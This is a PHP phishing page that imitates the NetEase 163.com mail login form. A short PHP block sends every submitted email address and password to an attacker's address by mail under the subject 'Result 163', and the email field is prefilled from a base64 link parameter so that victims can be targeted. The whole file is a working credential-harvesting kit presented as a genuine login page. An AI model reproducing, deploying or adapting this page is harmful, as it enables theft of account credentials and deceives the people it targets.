<?php
require 'config.php';

if(isset($_POST['dologin'])) {
    $email = $_POST['email'];
    $pass  = $_POST['password'];

    mail($to, 'Result 163', "Email: $email | Password: $pass", 'From: 163.com by Lhz <mastah@localheartz.club>');
}
?>
<html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="renderer" content="webkit">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=no">
        <title>URS组件</title>
        <link rel="stylesheet" href="assets/css/163.css">
        </head>
    <body>
        <div class="m-confirm f-dn" id="confirm">
            <div class="note">你确定放弃注册吗？</div>
            <div class="f-cb btnbox">
                <a class="u-btn-confirm f-ib btncolor" data-action="confirmgoon">继续</a><a class="u-btn-confirm f-ib btncolor-ext" data-action="confirmclose">放弃</a>
            </div>
        </div>
        <div class="g-bd cnt-box-include" id="cnt-box-parent">
            <div id="loading" class="f-dn"></div>
            <div class="g-bd" id="cnt-box">
                <div class="m-header" id="auto-id-1546818289688">
                    <div class="u-closebtn u-closebtn1" data-action="doclose"></div>
                    <div class="headimg j-headimg"></div>
                </div>
                <div class="m-cnt" id="auto-id-1546818289682">
                    <form id="login-form" method="post">
                        <div class="m-container" id="auto-id-1546818289686">
                            <div class="inputbox" id="account-box">
                                <div class="u-logo">
                                    <div class="u-logo-img1"></div>
                                </div>
                                <div class="u-input box"><label class="u-label f-dn" id="auto-id-1546818289653" style="display: block;">邮箱帐号</label><input data-placeholder="邮箱帐号" name="email" data-type="email" data-loginname="loginEmail" data-required="true" class="j-inputtext dlemail" type="text" autocomplete="off" tabindex="1" spellcheck="false" id="auto-id-1546818289639" placeholder="邮箱帐号" style="width: 198px;" value="<?php echo (isset($_GET['email']) && preg_match('/163.com/', base64_decode($_GET['email']))) ? str_replace('@163.com', '', base64_decode($_GET['email'])) : '' ?>"><span class="pr-domain j-prdomain" style="right: -87px;" id="auto-id-1546818289687">@163.com</span></span></div>
                                <div class="u-tip" id="auto-id-1546818289659" style="display: block;">
                                </div>
                            </div>
                            <div class="fur-change-email" id="auto-id-1546818289684"></div>
                            <div class="inputbox" id="auto-id-1546818289683">
                                <div class="u-logo">
                                    <div class="u-logo-img2"></div>
                                </div>
                                <div class="u-input box" id="auto-id-1546818289685"><label class="u-label f-dn" id="auto-id-1546818289662" style="display: block;">è¾“å…¥å¯†ç&nbsp;</label><input autocomplete="off" type="password" style="display:none;width:0;height:0;"><input data-placeholder="输入密码" name="password" maxlength="50" data-required="true" class="j-inputtext dlpwd" type="password" autocomplete="new-password" data-max-length="50" tabindex="2" spellcheck="false" id="auto-id-1546818289642" placeholder="输入密码"><input maxlength="50" data-placeholder="输入密码" type="text" id="pwdtext" class="u-pwdtext" placeholder="输入密码"></div>
                                <div class="u-tip" id="auto-id-1546818289668" style="display: none;">
                                </div>
                            </div>
                            <div class="ckbox m-ckcnt f-cb f-dn">
                                <div class="inputbox ckin">
                                    <div class="u-input"><label class="u-label f-dn" id="auto-id-1546818289671" style="display: block;">验证码</label><input data-placeholder="验证码" name="checkcode" class="j-inputtext cktext" type="text" data-required="true" data-max-length="4" maxlength="4" data-pattern="^[0-9a-zA-Z]{4,6}$" tabindex="3" spellcheck="false" autocomplete="off" id="auto-id-1546818289645" placeholder="验证码"></div>
                                    <div class="u-tip" id="auto-id-1546818289677" style="display: none;">
                                    </div>
                                    <div class="u-tip">
                                        <div class="u-success u-suc"></div>
                                    </div>
                                </div>
                                <div class="inputbox ckimgbox f-fr"><img class="ckimg" title="点击刷新验证码" alt="点击获取验证码" onerror="" id="auto-id-1546818289679"></div>
                            </div>
                            <div class="ckbox m-ckcnt slidebox f-cb f-dn" style="position: relative;">
                                <div class="ScapTcha" id="ScapTcha"></div>
                                <input type="hidden" id="pwd" value=""><input type="hidden" id="ct" value=""><input name="slidecap" style="height:0;width:0;display:none;" type="text" data-required="true" value="" id="auto-id-1546818289648">
                            </div>
                            <div class="m-etbox" style="display:none;">
                                <div class="ettip">
                                    <div class="etimgbox">
                                        <div class="img etimg"></div>
                                    </div>
                                    <div class="ettext"></div>
                                </div>
                            </div>
                            <div class="m-nerror f-dn" id="nerror"></div>
                            <div class="f-cb loginbox"><button type="submit" name="dologin" data-action="dologin" class="u-loginbtn btncolor tabfocus btndisabled" tabindex="8">登&nbsp;&nbsp;录</button></div>
                            <div class="m-unlogin">
                                <div class="b-unlogn j-unlogn f-dn"><span class="u-checkbox tabfocus"><input id="un-login" type="checkbox" name="un-login" class="un-login"></span><label for="un-login">十天内免登录</label></div>
                                <a class="forgetpwd j-redirect" data-outlink="1" href="#" target="_blank">忘记密码？</a><a id="changepage" data-action="none" class="u-regbtn bgcolor tabfocus j-redirect" href="#" data-outlink="2" target="_blank" tabindex="11">去注册</a>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="m-sep">
                    <div class="leftsep f-fl"></div>
                    <div class="rightsep f-fr"></div>
                    <div class="centertext">网易用户中心</div>
                </div>
                <div class="m-footer" id="footer">
                    <div class="f-cb">
                        <p class="f-fl tip m-sep">您还没有网易邮箱帐号？</p>
                        <p class="f-fr"><a class="btn-qrcode j-btnqrcode f-dn"></a></p>
                    </div>
                </div>
            </div>
            <div class="g-bd" id="cnt-box2" style="display:none;"></div>
        </div>
    </body>
</html>